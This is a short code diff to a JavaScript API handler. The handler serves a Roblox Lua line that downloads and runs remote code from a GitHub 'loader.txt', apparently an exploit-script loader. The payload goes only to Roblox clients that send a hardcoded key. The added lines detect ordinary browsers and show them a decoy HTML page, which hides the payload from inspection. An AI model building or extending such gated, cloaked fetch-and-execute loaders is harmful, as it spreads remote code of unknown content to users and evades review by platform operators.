@@ -7,11 +7,24 @@ export default function handler(req, res) {
       userAgent.includes("Roblox") ||
       req.headers['roblox-id'];
 
+    const isBrowser =
+      userAgent.includes("Mozilla") ||
+      userAgent.includes("Chrome") ||
+      userAgent.includes("Safari");
+
+    if (isBrowser) {
+      const fs = require('fs');
+      const path = require('path');
+      const html = fs.readFileSync(path.join(process.cwd(), 'index.html'), 'utf8');
+      res.setHeader("Content-Type", "text/html");
+      return res.status(200).send(html);
+    }
+
     if (key !== "rj20el" || !isRoblox) {
       return res.status(403).send("nice try, better luck next time");
     }
 
-    const luaScript = `loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-SECURE-DEX-AND-REMOTE-SPY-205256"))()`;
+    const luaScript = `loadstring(game:HttpGet("https://raw.githubusercontent.com/Fsploit/Akak/main/api/loader.txt"))()`;
     res.setHeader("Content-Type", "text/plain");
     return res.status(200).send(luaScript);
 
